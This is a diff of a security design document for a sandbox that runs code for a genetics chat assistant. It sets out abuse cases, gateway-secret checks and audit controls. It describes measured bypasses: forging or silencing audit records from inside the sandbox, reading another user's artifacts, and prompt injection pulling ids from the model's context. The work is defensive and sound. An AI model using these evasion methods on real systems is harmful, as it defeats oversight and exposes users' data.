-required the marker to arrive in `X-Internal-Auth` (auth-gateway's) rather than in
-`Authorization: Bearer` (mcp-server's and results-api's). Probed end to end through the real
-route: a bearer caller with an identity header was refused, and *the same caller became
-`gateway_asserted=True` the moment it also wrote its own secret into `X-Internal-Auth`*.
-mcp-server and results-api hold `INTERNAL_API_SECRET` by design
-(`k8s/deployments/mcp-server.yaml`, `k8s/deployments/results-api.yaml`) and choose their own
-request headers, so a header **name is not a secret**: the check had replaced "mcp-server
-chooses not to assert an identity" with "mcp-server chooses not to rename a header", which
-is the same class of convention `4h6.84` exists to eliminate.
-
-What actually separates the legitimate caller is a **second secret those callers do not
-hold**. `GATEWAY_IDENTITY_SECRET` (the `gateway-identity-secret` key of `genetics-secrets`,
-generated by `create-secrets.sh` alongside `internal-api-secret` and
-`sandbox-token-signing-key`) is mounted into **auth-gateway and chat-backend only**.
-auth-gateway's `render-config` initContainer substitutes it into the rendered nginx config
-next to `INTERNAL_API_SECRET` — same memory-backed emptyDir, same character whitelist, same
-placeholder `nginx -t` fallback — and both chat locations set
-`proxy_set_header X-Gateway-Auth "<secret>";` behind `auth_request /oauth2/auth`.
-`proxy_set_header` redefines rather than appends, so a client-supplied `X-Gateway-Auth`
-cannot survive the hop. `auth.core.is_gateway_caller` compares that value with
-`hmac.compare_digest` (bytes, latin-1 on the header against UTF-8 on the configured secret,
-well defined because the value is required to be ASCII);
-`auth.dependencies.gateway_asserted_identity` reduces "that secret **and** an identity
-header" to one boolean; `POST /chat/v1/chat` passes it to `ToolExecutor.run_analysis`,
-which **will not dispatch without it** — same `SandboxNotConfigured` / `retryable: false`
-shape, same `ERROR` log. The flag defaults to `false`, so a caller that never states a
-provenance loses code execution rather than inheriting trust. `auth_required`'s own
-precedence is unchanged: every other route stays reachable by any marker holder, because
-only sandbox dispatch needs this narrower fact, and `is_internal_caller` still accepts both
-transports of `INTERNAL_API_SECRET` for everything else.
-
-**Fail-closed on misconfiguration, and where that is enforced.** With
-`GATEWAY_IDENTITY_SECRET` unset or empty under `REQUIRE_AUTH=true`,
-`auth.core._expected_gateway_marker` answers `None`, `is_gateway_caller` answers `False` for
-every request, and dispatch is refused — the unset case can never widen the gate. That is a
-**dispatch-time** refusal, deliberately not a startup refusal: this secret gates one tool,
-whereas `INTERNAL_API_SECRET` (which *does* crash chat-backend at startup when unset,
-`618`) is load-bearing for every outbound call the process makes, and crash-looping
-chat-backend over the gateway key would turn a code-execution outage into a total chat
-outage — including in the window where the gateway leads the backend in a rollout. The
-operator-facing checks sit where they can act earlier: `deploy.sh` refuses to apply anything
-while the `gateway-identity-secret` key is absent or empty, both Deployments declare the
-`secretKeyRef` **non-optional** so the kubelet holds the pod at `CreateContainerConfigError`
-rather than starting it blind, auth-gateway's initContainer refuses to render a blank or
-nginx-unsafe value, and chat-backend logs an `ERROR` naming the variable at startup.
-
-**Enforced property, and its bound.** After `4h6.27` + `4h6.84`, the only requests that
-reach sandbox dispatch are those carrying a secret that exists in exactly two Deployments,
-neither of which is mcp-server — so the transitive `mcp-server -> chat-backend -> sandbox`
-path is closed *by a check on something mcp-server cannot produce*, not by mcp-server
-choosing not to assert an identity, and not by mcp-server choosing which header to use.
-It is still **not** authentication and does not survive: a compromised auth-gateway (which
-holds the secret and can assert any allow-listed address, so it can execute code as anyone
-oauth2-proxy would admit); a leak of `GATEWAY_IDENTITY_SECRET` to a pod that can reach
-chat-backend:8000 (the NetworkPolicies admit results-api, mcp-server and the monitor CronJob
-to that port in addition to auth-gateway itself — `policies.yaml`'s `allow-ingress-chat-backend`
-plus the additive `allow-ingress-chat-backend-from-monitor` in `monitor-policy.yaml`, which
-union rather than replace — so a leak plus any of that reach is enough — the header is not
-bound to a source address); or a
-deployment running `REQUIRE_AUTH=false`, where there is no proxy to assert anything and the
-gate stands down along with the rest of authentication — production sets it `true` in
-`k8s/deployments/chat-backend.yaml`. Independently of any of that, `_email_allowed` fails
-**open** when no allow-list is configured, so on such a deployment the *address* on an
-otherwise-valid gateway request is unconstrained; that is a separate defect and is not
-claimed closed here.
-
-Pinned by `tests/test_code_execution_tools.py::TestSandboxDispatchRequiresTheGatewaySecret`.
-Its refusals are asserted independently and unconditionally for a caller holding
-`INTERNAL_API_SECRET` and presenting it as `Authorization: Bearer`, as `X-Internal-Auth`,
-as **both at once** (the request that defeated the transport-based first attempt), and as
-`X-Gateway-Auth` carrying the wrong value; the control is the same request carrying
-`GATEWAY_IDENTITY_SECRET`, which must dispatch exactly once. A further case runs with the
-gateway secret unprovisioned and requires refusal. Negative control, run: reverting
-`is_gateway_caller` to the header-name comparison fails three of them — both bypass probes
-and the control.
-
-### Layer 3 — tests (`4h6.16`)
-
-`tests/test_mcp_server.py` asserts that `run_analysis` and `read_artifact` are absent from
-the **actual `/mcp` tool list** — enumerated from the live `FastMCP` instance, not by
-inspecting the `_mcp_disabled` constant. Asserting on the constant tests that someone typed
-the name; asserting on the tool list tests that the registration path honoured it, which is
-the property that matters. That enumeration covers the tools this server registers itself
-and **deliberately does not extend to `register_proxy_tools`**: a tool an external MCP
-server contributes under the name `run_analysis` routes to that external server and cannot
-reach our sandbox client, so it defeats enumeration by name without being a code-execution
-bypass. It is recorded as an accepted residual under layer 1 above rather than asserted
-against here, and no test covers the proxy path.
-
-Two further assertions landed alongside the second registration-layer control described in
-layer 1: that registering with the **empty** disabled set still does not produce
-`run_analysis` (the property configuration cannot undo), and, belt and braces, that the name
-is present in `_mcp_disabled` (the property an operator greps for and the one that catches a
-`@mcp.tool()` block added later).
-
-**The route assertion is satisfied by an import-graph assertion, and that is a deliberate
-substitution rather than a skipped deliverable.** What `4h6.16` asked for was an enumeration
-of the app's routes showing that none dispatches to the sandbox client — the MCP tool list is
-not the only surface, and a tool excluded from `/mcp` but reachable at `POST /chat` is the
-same failure with a different URL. What ships is
-`test_the_mcp_app_has_no_route_that_reaches_the_sandbox`, which imports
-`genetics_mcp_server.mcp_server` in a subprocess and asserts
-`genetics_mcp_server.sandbox_client` is **not** in `sys.modules` afterwards. This is the
-stronger form for the shape the code actually has: `mcp_server` builds the FastMCP app
-alone, `chat_api.py` is a separate ASGI app that is never mounted onto it, and
-`k8s/deployments/mcp-server.yaml` runs `python -m genetics_mcp_server.mcp_server` — so
-"enumerate this app's routes" would enumerate an app that has no route to the sandbox
-because it has no sandbox import to route to. Asserting the import graph fails earlier and
-catches the transitive case a route enumeration would miss. If mcp-server ever mounts
-`chat_api` or `routers/` onto the same app, this substitution stops being equivalent and the
-route-level enumeration has to be written.
-
-### Why layer 1 alone is insufficient
-
-Three independent reasons:
-
-1. **`_mcp_disabled` is assembled at runtime from mutable inputs.** It is the union of an
-   env-driven `_settings.disabled_tools` and a hardcoded set. There is a second
-   registration path in the same file — `register_proxy_tools` for external MCP servers,
-   filtered by a *different* set (`EXTERNAL_MCP_EXCLUDE_TOOLS`). A name omitted from a
-   registration list is one refactor away from being re-registered.
-2. **mcp-server's reachability is broad.** It is not behind oauth2-proxy. It accepts
-   `MCP_API_KEY` shared secrets, Google Identity Tokens (and `GOOGLE_TOKEN_AUDIENCE`
-   defaults to the *gcloud CLI's* OAuth client id, which anyone with a Google account can
-   mint against — the email allow-list is the actual gate), per-user chat API tokens, and
-   Keycloak OAuth 2.1 tokens from separately registered third-party clients such as
-   brainzzz. The set of parties who can drive mcp-server is larger than the set who can use
-   the browser.
-3. **The precedent is already documented in this repo.** `docs/project-spec.md` records
-   that mcp-server sits on both sides of the `allow-ingress-db-api` policy, so "anything
-   that could drive mcp-server could reach BigQuery behind it". The same shape applied to
-   code execution would mean anything that could drive mcp-server could run code. The fix
-   there was to add an authentication layer *in addition to* the network layer; the fix
-   here is the same instinct applied before the fact.
-
-With all three layers, the worst case from a registration mistake is that a tool appears in
-the MCP tool list and every invocation fails with a connection error — noisy, visible, and
-not code execution.
+**Why layer 1 alone is insufficient.** The disabled set is assembled at runtime from mutable
+inputs and there is a second registration path filtered by a different set, so a name omitted
+from a list is one refactor away from being re-registered. mcp-server's reachability is broad —
+not behind oauth2-proxy, four bearer paths, one of whose audiences anyone with a Google account
+can mint against. And the precedent is already in this repo: mcp-server sits on both sides of
+`allow-ingress-db-api`, so anything that could drive it could reach BigQuery behind it. With
+all three layers, the worst case from a registration mistake is a tool that appears in the list
+and fails every invocation with a connection error — noisy, visible, and not code execution.
 
 ---
 
 ## 6. Abuse cases and the control that stops each
 
-### 6.1 Crypto mining / CPU burn
+| abuse | control |
+|---|---|
+| Crypto mining / CPU burn | the CPU limit, the wall clock, and no egress to a pool or a payload |
+| Exfiltration via db-api | the per-request caps (defaults, not penalties), `endpoint_access` attribution by `sub`/`sid`/`jti`, and no network path off the cluster |
+| Exfiltration via DNS | eliminated: no kube-dns egress, `hostAliases` only |
+| Resource exhaustion starving chat-backend | separate pod, separate node pool, its own cgroup limits; the queue is bounded in depth *and* wait |
+| Reading another user's data on disk | retained artifacts are sealed under a per-execution key; the live window is not closed |
+| Serving another user attacker-controlled bytes | the manifest's digests, re-checked on the way out |
+| Persisting across executions | `/scratch/<id>` is per-execution and wiped; unrecognised entries are wiped at startup; the fork server sweeps what reparents to it |
+| Executing code via MCP | section 5's three layers |
 
-**Controls, in order of effect:** no internet egress, so there is no pool to join and no
-payload to download — a miner needs both. CPU `limits: 1500m`. Wall clock 60s default /
-120s hard, not model-overridable. `pod_pids_limit: 1024`, with the supervisor's own child pid
-budget far below it. Concurrency 1 with a queue, so a
-loop of submissions serializes rather than multiplying. Nothing executable persists:
-`/scratch/<id>` is deleted on completion except for the artifacts subdirectory, which is
-inert data on a 5-minute reaper (see the `read_artifact` subsection); the root filesystem
-is read-only; there is no pod-level `/tmp`; and there is no cron, no PVC and no service
-account token, so a miner cannot survive the 120-second ceiling.
+### `read_artifact`: lifecycle, authorization, and what the retention window serves
 
-**Worst case if all of that is exercised deliberately:** 1.5 cores for 120 seconds at a
-time on a node that exists solely for this. That is a wasted node, not an incident.
+The tool takes an artifact **name**, never a path and never a model-supplied execution id.
+chat-backend resolves it server-side against executions owned by the requesting **user and**
+chat session — the `(sub, sid)` pair, since `sid` arrives in the request body and authorizes
+nothing on its own — and `404`s otherwise. Name collisions within one `(sub, sid)` key resolve
+to the most recently completed still-retained execution that produced the name. It then proxies
+over HTTP to the sandbox and performs **no local filesystem access at all**: the descriptor
+checks run inside the sandbox pod, against the directory the hostile child actually wrote to.
+`SUBAGENT_ALLOWED_PATHS` never gains a reader.
 
-### 6.2 Data exfiltration via db-api
+**The `execution_id` is the authorisation on the HTTP surface, and the qualifier is
+load-bearing.** It is a uuid4 minted per execution, equal to the tokens' `jti`, never rendered
+to the model, and there is no route that lists execution ids — so combined with the ingress
+policy it has exactly the standing `/execute` has. **It is not a filesystem property.**
+`/scratch` is fully enumerable by any process at the shared uid; measured from inside a second
+execution's child, which listed it, found a previous execution's directory and read its
+`artifacts/private.csv`. The id bounds who can ask *the supervisor* for bytes; it bounds nothing
+about who can open the file.
 
-This is the honest one, and it needs the question framed correctly. A script can
-legitimately issue arbitrary SQL against the views — that is the entire feature. Bulk
-extraction is not preventable by restricting the query.
+**What the window serves: the bytes the manifest described, or nothing.** The same measurement
+showed the peer artifact could be overwritten and a new file planted beside it, so for the
+retention window this route would have handed attacker-controlled content back under another
+user's execution id with every descriptor check satisfied. `build_manifest` therefore hashes
+every file it lists and keeps the map **in the supervisor's memory** — never on the filesystem,
+since a manifest written to `/scratch` would be forged in the same breath as the file it
+describes. On the way out: a name **not in the manifest** is `404`, refused before it is
+opened; a name whose **bytes have changed** is `409 ArtifactModified`, a distinct answer on
+purpose, because a caller holding a legitimate id and a manifest that named the file is
+entitled to know the answer is "this is no longer what you were told about" rather than a `404`
+it would read as an expired window; a file larger than the read cap is listed with no digest,
+so a later truncation makes it unverifiable rather than servable.
 
-What *is* preventable is data leaving the user's own conversation. The controls:
+**Artifact encryption at rest.** Between the reap and the manifest the supervisor seals the
+retained artifacts in place with AES-256-GCM under a per-execution key that exists only in its
+memory and is never written anywhere; the read opens them again on the way out. The associated
+data binds the execution id **and** the name, so a sealed file moved between names or lifted
+into another execution fails authentication.
 
-1. **There is no sink** — and this claim depends on the no-DNS decision in section 3. The
-   only two ways bytes leave the pod are stdout (capped at 64 KiB to the model, 8 MiB from
-   the pipe) and `/scratch` (512 MiB, retrievable only over the chat-backend-only ingress
-   path and only as **image artifacts**, at most four per run and 512 KiB each, fetched by
-   chat-backend against an `execution_id` it minted for the submitting session — see
-   `GET /artifact` in section 2 and the `read_artifact` subsection below). Both sinks are
-   therefore bound to the chat session that submitted the script, and neither is addressable
-   by the script itself. No internet egress, no PVC,
-   no other service, **and no DNS**: with kube-dns egress allowed this claim would be
-   false, because subdomain-label encoding sustains roughly 200 KB/s and needs no response
-   (section 3, "On DNS"). If DNS is ever restored, this control is downgraded from "no
-   sink" to "a bandwidth-limited sink", and must be reworded here.
-2. **Byte and row caps** (section 4): on db-api, 50 GB per query, **200 GB aggregate per
-   `jti`** across all four of its BigQuery paths, 25 000 response rows, and — since `4h6.61` —
-   a per-`jti` request count (1000) and concurrency (4, and 8 pod-wide) enforced before
-   routing, so its zero-BigQuery paths are counted too; on results-api, a
-   16 MiB response-byte cap, no row cap, and per-`jti` aggregate bytes (1 GiB), request count
-   (1000) and concurrency (4, and 8 pod-wide) — all as defaults, not as a sandbox-only penalty. A
-   full-table dump fails rather than succeeding slowly, and a loop of medium queries hits the
-   aggregate budget on either service rather than running for the full 120 seconds.
-3. **The SDK records what it reads — the trail is attributable, and it is now collected.**
-   Every `GeneticsClient` coroutine method and every `genetics.<fn>` sync
-   wrapper emits one structured line carrying function, argument summary and row count
-   (`4h6.12`), and db-api logs `sid`, `sub` and `jti` per request. Four limits, all present
-   in the code today, and none of them cosmetic:
-   - **WHICH IDENTITY IS AUTHORITATIVE, since two are rendered.** The SDK renders
-     `[user=…] [session=…] [execution=…]` per call from `SANDBOX_USER`, `SANDBOX_SESSION_ID`
-     and `SANDBOX_EXECUTION_ID`, which the supervisor does set in the child's environment from
-     the token's `sub`, `sid` and `jti` (`supervisor.py`, `ExecutionDirs.child_env`) — an
-     earlier draft of this file said nothing set them and all three rendered `unknown`, which
-     is out of date. **On the collected path that prefix is not what attributes the record.**
-     The supervisor discards it and re-stamps from the same claims on the read end (`4h6.45`),
-     because the child owns its environment and can rewrite all three between two calls. **The
-     environment prefix and the signed claims are not the same evidence**, and only the second
-     one leaves the pod. Both halves of token delivery have landed — the supervisor writes the
-     token file and names it in `SANDBOX_TOKEN_FILE` (`4h6.43`), the SDK reads and unlinks it
-     and sends the audience-bound token (`4h6.44`) — so db-api's and results-api's
-     `endpoint_access` lines carry the same three values from the token itself, and the join
-     across the three sinks closes on one `jti`.
-   - **The lines now reach a collector.** The cluster's logging agent collects the *pod's*
-     stdout, and `4h6.45` forwards the re-framed records there (locally: the container's
-     stdout, where `scripts/run-sandbox-local.sh --logs` shows them). Before it, the child's
-     streams went into the supervisor's pipe and nothing forwarded them, so the control
-     produced records nothing ingested.
-   - **The fd never separated the records from the *script*, and still does not — the
-     supervisor does.** The fd number must be in the child's environment for the SDK to find
-     it, so `os.write(int(os.environ["GENETICS_SDK_AUDIT_FD"]), …)` puts arbitrary bytes
-     straight on it. What changed is what happens next: every line is matched whole against the
-     record shapes and re-emitted under the supervisor's stamp, so a child can still *write*
-     anything but cannot get a forged identity, a broken frame or chosen prose past the read
-     end. Measured: a rewritten `SANDBOX_USER` plus a hand-written `[user=admin@finngen.fi]`
-     prefix reached the container's stdout as `[user=dave@finngen.fi]`, with the forged string
-     nowhere in the log. On a **shared** stream — anything that is not this fd — none of that
-     holds: a forged line parses cleanly through this repo's own parser under any user it
-     likes, and per-value escaping is irrelevant when the writer owns the stream. The SDK emits
-     a once-per-process warning saying so, in the stream itself, and
-     `scripts/analyze_conversations.py` repeats it in any report built from such a log; a
-     report built from a sandbox log should never carry it.
-   - **`_executor` calls are not audited at all.** Instrumentation sits on the curated
-     surface; `get_client()._executor.<method>()` is one attribute access away from a
-     sandboxed script and returns the same data with no line emitted (`4h6.33`). So this is
-     "audited if you use the recommended surface", never "unbypassable" — false in
-     principle, not only in deployment.
+**The property is "a retained directory is sealed or empty", and it is structural.** Stated
+over the directory rather than over every artifact because the second sentence was measurably
+false: the seal pass runs on the completion path, so any exception out of `_execute_inner`
+propagated past it and the directory was retained for the whole window with the child's
+plaintext where it wrote it — the original demonstrated attack, reproduced against the sealed
+build. It is now enforced on the retain path itself, which every route to retention passes
+through.
 
-   Three further properties are deliberate rather than gaps. **The bound applies only to
-   refusals** — calls that never reached the executor — capped at `_AUDIT_MAX_REFUSALS = 1000`
-   per *process*, after which they are dropped and one "SDK audit truncated" notice is
-   emitted. A call that reached the executor is **never** dropped. Both halves are corrections
-   to an earlier revision that capped everything at 1000 per *execution*: that ceiling was
-   keyed on `SANDBOX_EXECUTION_ID`, which the script writes, so rotating it restored the flood
-   at 19,622 lines/s and 2.58 MB/s — *higher* than the 18,088 lines/s before the ceiling
-   existed, because each rotation also bought a truncation announcement. And the ceiling was
-   itself a suppression primitive: ~50 ms of refusals, which touch no network at all,
-   exhausted the budget, and every genuine `sql()` read afterwards emitted nothing. Silent
-   suppression on demand is strictly worse than a noisy flood. Hence the split — a refusal is
-   free to the caller and worth bounding, while a call that reached the executor already paid
-   an HTTP round-trip and is charged against the byte and row quotas the other controls rely
-   on, so it cannot be driven at flood rates. Measured after the change: a refusal flood *with*
-   id rotation settles at 0 lines/s steady-state, and 5,000 refusals followed by 25 real reads
-   records 25 of 25. **The identity fields are sanitised** on the same terms as arguments,
-   which they previously skipped: `SANDBOX_USER = "alice\n[user=admin@finngen.fi"` rendered a
-   line the shipped parser read back as `user='admin@finngen.fi'`, and a 100 KB value put
-   100,431 bytes on the stream from one legitimate call. Both are charset- and length-checked
-   now, and a failing value is *replaced* by `<invalid>` rather than truncated into something
-   plausible — the forgery renders `user='<invalid>'`, and the 100 KB case emits 197 bytes.
-   **The argument summary answers "how much", not "what"** for the most powerful calls:
-   `sql()` bodies render as `<str:N>` and every list argument as `<list:N>`, deliberately, so
-   a script cannot write chosen text into an operator's log. Row count is the only content
-   signal that survives there.
+**What it does and does not close.** It closes the cross-execution read of a **completed**
+execution. It does **not** close the live window: the child writes plaintext with a raw
+`open()` into its own artifacts directory and there is no SDK chokepoint to intercept, so a
+same-uid resident reading *during* an execution is untouched. Nor does it make the key
+unreachable — the key inherits exactly what the digest map has, YAMA `ptrace_scope=1` plus the
+supervisor being the child's **ancestor**, and **not** seccomp: `RuntimeDefault` allows
+`ptrace`, measured. Under runsc, uid 0 could write `ptrace_scope=0`, so "no uid 0 in the
+sandbox" is load-bearing here rather than hygiene.
 
-   **No IN-PROCESS mechanism can make these records trustworthy, which is why the enforcement
-   is not in-process.** A validator defeated every control inside the SDK from inside the
-   sandbox: forging records by calling
-   `logging.getLogger("genetics_mcp_server.sdk.audit").info(...)` directly and by `os.write`
-   to the audit fd number the script reads from its own environment, and suppressing them via
-   `logger.disabled`, the level, a filter, and handler removal. As long as the audited code
-   and the audit emitter share an address space this is the consequence of where the code
-   runs, not a list of gaps to patch one by one — a dedicated fd separates the stream from
-   stdout, not from the script. `4h6.45` moved the enforcement out of the process: the
-   *supervisor* reads the fd and applies the rate, byte and per-line caps on the read end where
-   the child cannot reach them; the *supervisor*, which holds the sandbox token, stamps
-   `[user=…] [session=…] [execution=…]` from its `sub`/`sid`/`jti` claims instead of asking the
-   child who it is; and the child's framing is untrusted input, re-parsed and re-framed before
-   anything is recorded. **What that buys is precise, and it is less than "trustworthy
-   records": attribution and framing, not truth.** A script can still emit well-formed records
-   for calls it never made, `_executor` reads are invisible to all of this, and a child can
-   still lose its own later records by flooding its own pipe — bounded, counted and announced
-   when the *supervisor* is the one dropping them. **The four in-process suppression mechanisms
-   above are untouched by `4h6.45` and remain completely silent**: they stop the bytes before
-   the fd, so the supervisor sees an empty stream and says so with the same `records=0` summary
-   an execution that made no SDK calls produces. The read end bounds what a child can *write*
-   to an operator, not what it can *withhold*. It also says nothing about a `setsid()` escapee or a child reading
-   `/proc/self/mem`: `4h6.55` bounds those and nothing here does. For "what did that script
-   actually read, under an assumption of compromise", the answer remains db-api's and
-   results-api's `endpoint_access` lines, written outside this pod.
-4. **The sandbox grants no data the caller lacked.** The same user can already query the
-   same views through the existing tool surface. The sandbox changes the *shape* of
-   access, not its scope.
+**Deletion is not covered by any of this.** A same-uid process can still delete a retained
+artifact, and the answer is then an honest `404`.
 
-So the residual is: an authorized user extracts, into their own chat window, data they were
-already authorized to see — 64 KiB at a time. That is unchanged from today and is not a
-regression. The thing the design *does* prevent is that data reaching a third party without
-passing through the user's authenticated session.
+### The audit trail, and what it is worth
 
-**That conclusion survives control 3's state, but only half of it does — stated because an
-earlier draft leaned on the other half.** The residual above rests on controls 1, 2 and 4,
-which are unaffected: no sink, capped bytes and rows, no data the caller lacked. What does
-*not* follow any more is "a dump is visible after the fact and attributable to a person and a
-conversation" — the earlier wording of control 3, and false in every part. Attribution is the
-axis on which the sandbox is a **regression** rather than a wash: the same reads through the
-existing MCP tool surface already carry the user and the session in chat-backend's
-`Executing tool:` lines, and script-driven reads did not, so enabling the sandbox ahead of
-token delivery and audit forwarding (see section 4 on `SANDBOX_ENABLED`) would have bought a
-query path whose "who ran that?" is unanswerable. It is still *bounded* — nothing leaves the
-user's own session, nothing new is reachable. Both halves have now landed. Token delivery:
-the supervisor writes the read-once file (`4h6.43`) and the SDK reads it and sends the
-audience-bound token (`4h6.44`), so db-api's and results-api's `endpoint_access` lines carry
-`sub`, `sid` and `jti` from the signed token. Collection: the supervisor reads the audit fd,
-caps it on the read end, re-frames every record and stamps it from those same claims onto the
-pod's stdout (`4h6.45`), so the sandbox's own records now reach a collector and join to the
-upstream ones on `jti`. **The remaining limit is not collection, it is what a record proves.**
-Under an assumption of compromise the SDK's records still do not establish what a script did —
-the script and the emitter share a process, so it can write well-formed records for calls it
-never made and read data through `_executor` with no record at all. So: cite the SDK records
-for "what did a well-behaved script read", cite the supervisor's stamp for "whose execution
-was that", and cite `endpoint_access` for anything that has to hold against a hostile one.
+The SDK writes one record per call on a dedicated fd; the supervisor holds the read end and
+re-parses, re-frames and re-stamps every record from the **tokens'** `sub`/`sid`/`jti` before
+putting it on the pod's stdout. Every cap — per-record bytes, per-execution bytes, rate — is
+applied there, by the process the child cannot reach into, and none is keyed on anything the
+child writes. In-SDK controls were defeated by running them: records were forged with a logger
+call and with `os.write` to the fd number the script reads from its own environment, and
+silenced with `logger.disabled`, the level, a filter and handler removal.
 
-### `read_artifact` (`4h6.15`): lifecycle, authorization, and the path allow-list
-
-`read_artifact` was under-specified in an earlier draft to the point of being three
-separate holes, and both 6.2 and 6.4 lean on it. It is specified here.
-
-**Retention — resolving the lifecycle contradiction.** Section 2 says `/scratch/<id>` is
-deleted on completion; 6.2 and 6.4 both depend on artifacts being retrievable *after*
-completion. As written the tool could never return anything, and an implementer who
-resolved that by simply keeping the directory would silently invert the "nothing persists"
-property that 6.1 and 6.4 assert. The rule:
-
-- On completion, the supervisor deletes everything under `/scratch/<id>` **except**
-  `/scratch/<id>/artifacts` — the one subdirectory whose contents are retrievable afterwards.
-  **Nothing in the SDK writes it.** An earlier version of this line called it "the one
-  subdirectory the SDK writes named outputs into"; that was wrong. The shipped SDK and the
-  stubs under `sandbox/stubs/` expose **no artifact-writing function at all** — the supervisor
-  exports `SANDBOX_ARTIFACTS_DIR` into the child's environment and the script writes there
-  with an ordinary `open()`. That absence is not cosmetic: it is why `4h6.88` had to encrypt
-  **after** the reap rather than at a write chokepoint, and why the live window stays open.
-  Working files, temp, `HOME`, caches and any inputs go immediately.
-- Everything retained is **encrypted in place** before the manifest is built
-  (`genetics-results-suite-4h6.88`); anything that could never have been served — a
-  subdirectory, a symlink, a hard link, an unretrievable name — is deleted instead. See
-  "Artifact encryption at rest" under `GET /artifact`.
-- `/scratch/<id>/artifacts` is retained for **5 minutes** from completion, then deleted
-  unconditionally by the supervisor's reaper, whether or not it was ever read. Five
-  minutes is longer than any plausible same-turn retrieval and far shorter than a session.
-- **The 5 minutes is a floor, not an instant.** Deletion happens on a reaper tick and the
-  reaper polls every 30 s (`REAPER_POLL_S`), so a directory is present until the
-  deadline and gone by **deadline + 30 s**; in between it may be either. Tightening the poll
-  narrows the window without closing it, and polling is also what catches orphans the retention
-  registry has no row for, so the window is stated rather than engineered away. **Anything
-  asserting this boundary** — `4h6.49` is instructed to — must assert presence at some
-  `t < TTL` and absence only at `t >= TTL + 30 s` plus its own margin, driving it with the
-  `SANDBOX_RETENTION_S` override; the override shortens the TTL but **not** the poll, so the
-  30 s term stays 30 s however short the TTL is made.
-  **The presence half of that assertion holds only while nothing else is retaining
-  concurrently.** Presence until the deadline is not unconditional: a *later* completion that
-  pushes the retained aggregate over the 256 MiB ceiling makes `_enforce_retained_ceiling`
-  evict oldest-first, and `_forget_retained` deletes a directory **before** its deadline. So
-  the boundary is "present until the deadline **unless the retained ceiling evicts it first**,
-  gone by deadline + 30 s". A test asserting presence at `t < TTL` must therefore be the only
-  thing retaining for the duration of that window — one execution, or a total well under the
-  ceiling — or it is asserting against a directory another execution is entitled to delete.
-  `scripts/test-supervisor.py`'s
-  `test_retention_expiry` already does exactly this — `retention_s + REAPER_POLL_S + 2` against
-  a container, `reap_expired()` called directly in-process — and is the shape to copy.
-- Retention does not survive a pod restart, and the supervisor wipes unrecognised
-  `/scratch` entries at startup (section 2, Writable paths).
-- So "nothing persists" is now precise: **nothing persists beyond 5 minutes, and nothing
-  is ever readable by a different user or a different chat session** (next point). Sections
-  6.1 and 6.4 are worded against that.
-
-**Authorization — the execution id is not a secret.** 6.2 asserts artifacts are retrievable
-"by the same authenticated session that submitted the script" and an earlier draft gave no
-mechanism for it. Execution ids are unguessable but *not* confidential: the execution id is
-the token's `jti`, it appears in db-api's structured logs, in the SDK instrumentation, and
-in the model's own context — from where a prompt injection can read it back out. Knowledge
-of the id must therefore confer nothing. The mechanism:
-
-- `read_artifact` takes an artifact **name** (e.g. `"manhattan.png"`), never a path and
-  never an execution id supplied by the model or the operator.
-- chat-backend resolves that name **server-side**, against the set of executions it recorded
-  as belonging to the **requesting user AND chat session** — the `(sub, sid)` pair it minted
-  the token with, not any tool argument.
-- **The user term is the authorization; the session term alone is not**
-  (`genetics-results-suite-dh3`). An earlier version of this bullet said the `sid` was "taken
-  from the authenticated request", and that was false: `session_id` arrives in the `/v1/chat`
-  request **body**, no code checks it against the caller or against the sessions table, and it
-  becomes the token's `sid` verbatim. Keying the manifest on it alone therefore meant user B
-  could put user A's session id in B's own request and have B's model `read_artifact` A's
-  bytes. `sub` is the half that is not the caller's to choose — **but only because both tools
-  that touch the manifest require the auth-gateway provenance assertion**. That is a real
-  qualification, not a hedge: `get_authenticated_user` honours the proxy identity header from
-  *any* caller presenting `INTERNAL_API_SECRET` (mcp-server and results-api hold it by design,
-  and the NetworkPolicy admits mcp-server to chat-backend:8000), so to a marker holder `sub` is
-  exactly as forgeable as `sid`. `run_analysis` has required `gateway_asserted` since
-  `4h6.84`; `read_artifact` did **not** when the `(sub, sid)` key first shipped, so the write
-  path was gated by provenance and the read path was not, and a marker holder could name the
-  victim as `user` and read the victim's artifacts — measured, and fixed under the same bead by
-  giving `read_artifact` the identical gate. With the gate on both, the manifest key carries two
-  terms the caller cannot supply, and a stolen or guessed `sid` resolves to nothing for anyone
-  but its owner. It was never exploitable in production
-  (`SANDBOX_ENABLED` was `false` everywhere, so no artifact was ever recorded), which is why it
-  was fixed before the flag was flipped rather than after.
-- **Both halves fail closed, and totally.** A `read_artifact` call missing `user` or
-  `session_id` — or carrying a non-string one — reads nothing rather than falling back to the
-  half it has, and a `record` missing or malforming either stores nothing. Half a key is not a
-  weaker authorization, it is none; and a non-string identity is unhashable, so without the type
-  check it would raise out of the tuple lookup and answer in a shape distinct from
-  `ArtifactNotFound`. Nothing produces one today (`get_authenticated_user` returns `str | None`)
-  — the guard is written to hold regardless. This is the shape the MCP
-  registration wrapper (which holds neither) and any future internal-only caller meet.
-- An artifact belonging to another user or another session is `404`, indistinguishable from a
-  name that does not exist.
-- **The supervisor is deliberately not part of this check.** `GET /artifact` authorizes the
-  execution id and the digest map, not the session or the subject: chat-backend is the only
-  side that knows which session owns which execution, so the whole ownership question is
-  asked there and nowhere else.
-
-**`run_analysis`'s response contract, because the resolution above depends on it.**
-chat-backend can only resolve a name against "executions it recorded" if the execution told
-it what it produced. So `run_analysis`'s response is specified here rather than left to
-the task that implements the tool (`4h6.48`), and it is **not** implemented anywhere today:
-alongside the 64 KiB stdout/stderr and the exit status it returns an **artifact
-manifest** — for each file under `/scratch/<id>/artifacts`, its `name`, `size` in bytes, and
-`content_type`. chat-backend records that manifest against the execution's `jti` under the
-`(sub, sid)` key and serves `read_artifact` from it; the model sees the manifest and so knows what names are
-retrievable without guessing. The manifest carries **no paths and no execution id** — the
-same reason `read_artifact` takes a name.
-
-**A quota kill deletes artifacts NEWEST-FIRST, and that is visible to whoever reads the
-manifest.** When `artifacts/` is over its 64 MiB / 1024-entry quota the supervisor trims it
-back after the kill, and the victim order is mtime-descending with no size awareness: the entry
-being written when the kill landed is assumed to be the culprit. That is right for the case the
-trim exists for and wrong for an ordinary one — a script that writes a 100 MiB CSV **first** and
-then fifty small plots loses the fifty plots first, and then loses the CSV too, because no
-number of plots brings a tree under a quota one file alone exceeds. The policy is kept anyway:
-a size-aware pass would delete the large output the user actually asked for and keep incidental
-ones. The consequence a client must handle: after `status: "limit"` with
-`error.type: "ArtifactQuota"` the manifest can be **short or empty** even though the script
-wrote those files successfully, so a name the model can see in its own code may simply not be
-offered, and asking for it is a legitimate `404`. The manifest never *lies* — the trim runs
